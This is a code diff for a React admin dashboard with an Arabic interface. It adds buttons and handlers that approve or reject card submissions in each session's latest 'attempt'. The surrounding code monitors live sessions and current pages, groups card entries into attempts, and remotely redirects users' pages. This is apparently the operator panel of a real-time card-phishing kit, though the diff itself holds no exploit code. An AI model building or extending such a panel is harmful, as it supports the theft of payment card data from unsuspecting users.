@@ -1,7 +1,7 @@
 ﻿import { useEffect, useMemo, useState, useCallback, useRef, type ReactNode } from "react";
 import { useLocation } from "wouter";
 import { getToken, logoutAdmin } from "@/lib/auth";
-import { getAdminStats, listAdminSubmissions, sendAdminControl, adminLogoutAll, adminChangePassword, getAllAdminSubmissions, getAdminSubmissionsFromSupabase, sendNavigationCommand, type NavigationAction } from "@/lib/api";
+import { getAdminStats, listAdminSubmissions, sendAdminControl, adminLogoutAll, adminChangePassword, getAllAdminSubmissions, getAdminSubmissionsFromSupabase, sendNavigationCommand, updateSubmissionStatus, type NavigationAction, type SubmissionStatus } from "@/lib/api";
 import { getAdminSettings, saveAdminSettings, getBlockedSessions, blockSession, unblockSession, getTrashItems, moveSubmissionToTrash, restoreTrashItem, deleteTrashItem, clearTrash } from "@/lib/admin-store";
 import { getPageName } from "@/lib/heartbeat";
 import { Button } from "@/components/ui/button";
@@ -272,6 +272,8 @@ function SessionHistoryDialog({ open, rows, onClose }: { open: boolean; rows: Su
 function AttemptBlockCard({
   block,
   onControl,
+  onApprove,
+  onReject,
   loadingAction,
   isLatest,
   isActive,
@@ -280,6 +282,8 @@ function AttemptBlockCard({
 }: {
   block: AttemptBlock;
   onControl: (sessionId: string, action: string) => Promise<void>;
+  onApprove: (submissionId: number) => Promise<void>;
+  onReject: (submissionId: number) => Promise<void>;
   loadingAction: string | null;
   isLatest: boolean;
   isActive: boolean;
@@ -314,6 +318,12 @@ function AttemptBlockCard({
             <span className="flex items-center gap-1 text-xs text-green-600">
               <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
               نشط
+            </span>
+          )}
+          {/* Status Badge */}
+          {isProcessed && (
+            <span className={`text-xs font-bold px-2 py-1 rounded-full ${isApproved ? "bg-green-100 text-green-700" : "bg-red-100 text-red-700"}`}>
+              {isApproved ? "تمت الموافقة" : "تم الرفض"}
             </span>
           )}
         </div>
@@ -393,8 +403,8 @@ function AttemptBlockCard({
         </div>
       )}
 
-      {/* Action Buttons - Only for the latest attempt */}
-      {isLatest && (
+      {/* Action Buttons - Only for the latest attempt and not yet processed */}
+      {isLatest && block.card && !isProcessed && (
         <div className="grid grid-cols-2 gap-2 mt-2">
           <button
             type="button"
@@ -414,6 +424,36 @@ function AttemptBlockCard({
           </button>
         </div>
       )}
+
+      {/* Status Actions - For cards that need approval/rejection */}
+      {isLatest && block.card && !isProcessed && (
+        <div className="grid grid-cols-2 gap-2 mt-2">
+          <button
+            type="button"
+            disabled={loadingAction === "approve"}
+            onClick={() => {
+              if (cardId) {
+                void onApprove(cardId);
+              }
+            }}
+            className="rounded-2xl bg-blue-600 px-3 py-2 text-xs font-semibold text-white hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-50"
+          >
+            {loadingAction === "approve" ? "...جارٍ" : "✓ موافقة"}
+          </button>
+          <button
+            type="button"
+            disabled={loadingAction === "reject"}
+            onClick={() => {
+              if (cardId) {
+                void onReject(cardId);
+              }
+            }}
+            className="rounded-2xl bg-red-600 px-3 py-2 text-xs font-semibold text-white hover:bg-red-700 disabled:cursor-not-allowed disabled:opacity-50"
+          >
+            {loadingAction === "reject" ? "...جارٍ" : "✗ رفض"}
+          </button>
+        </div>
+      )}
     </div>
   );
 }
@@ -427,6 +467,8 @@ function SessionBox({
   currentPage,
   onToggleSelect,
   onControl,
+  onApprove,
+  onReject,
   onBlock,
   onUnblock,
   onDelete,
@@ -441,6 +483,8 @@ function SessionBox({
   currentPage?: string;
   onToggleSelect: () => void;
   onControl: (sessionId: string, action: string) => Promise<void>;
+  onApprove: (submissionId: number) => Promise<void>;
+  onReject: (submissionId: number) => Promise<void>;
   onBlock: () => void;
   onUnblock: () => void;
   onDelete: () => void;
@@ -480,6 +524,26 @@ function SessionBox({
   // Handle redirect with loading state
   const handleRedirectAction = (target: NavigationAction) => {
     onRedirect(target);
+  };
+
+  // Wrapper for approve/reject that manages loading state
+  const handleApprove = async (submissionId: number) => {
+    setLoadingAction("approve");
+    try {
+      await onApprove(submissionId);
+    } finally {
+      setLoadingAction(null);
+    }
+  };
+
+  // Wrapper for approve/reject that manages loading state
+  const handleReject = async (submissionId: number) => {
+    setLoadingAction("reject");
+    try {
+      await onReject(submissionId);
+    } finally {
+      setLoadingAction(null);
+    }
   };
 
   return (
@@ -626,6 +690,8 @@ function SessionBox({
                       key={block.attemptNumber}
                       block={block}
                       onControl={handleBlockControl}
+                      onApprove={handleApprove}
+                      onReject={handleReject}
                       loadingAction={loadingAction}
                       isLatest={index === 0}
                       isActive={isSessionActive}
@@ -921,6 +987,36 @@ export default function AdminDashboard() {
     }
   }, []);
 
+  // Handle approve submission (set status to APPROVED)
+  const handleApproveSubmission = useCallback(async (submissionId: number) => {
+    console.log("📤 handleApproveSubmission called:", submissionId);
+    try {
+      const result = await updateSubmissionStatus(submissionId, 'APPROVED');
+      console.log("✅ Approve result:", result);
+      if (result) {
+        // Refresh data to update the UI
+        void fetchData();
+      }
+    } catch (err) {
+      console.error("❌ handleApproveSubmission error:", err);
+    }
+  }, [fetchData]);
+
+  // Handle reject submission (set status to REJECTED)
+  const handleRejectSubmission = useCallback(async (submissionId: number) => {
+    console.log("📤 handleRejectSubmission called:", submissionId);
+    try {
+      const result = await updateSubmissionStatus(submissionId, 'REJECTED');
+      console.log("✅ Reject result:", result);
+      if (result) {
+        // Refresh data to update the UI
+        void fetchData();
+      }
+    } catch (err) {
+      console.error("❌ handleRejectSubmission error:", err);
+    }
+  }, [fetchData]);
+
   const blockedMap = useMemo(() => Object.fromEntries(blockedSessions.map((entry) => [entry.sessionId, entry])), [blockedSessions]);
   const sessionCount = Object.keys(sessions).length;
   const cardCount = stats?.byType.find((item) => item.type === "card")?.count ?? 0;
@@ -1040,6 +1136,8 @@ export default function AdminDashboard() {
                     }}
                     blocked={blockedMap[sessionId]?.message}
                     onControl={handleControlAction}
+                    onApprove={handleApproveSubmission}
+                    onReject={handleRejectSubmission}
                     onBlock={() => handleBlock(sessionId, parseData(rows[0]?.data ?? null).ownerName)}
                     onUnblock={() => handleUnblock(sessionId)}
                     onDelete={() => handleDeleteSession(sessionId)}
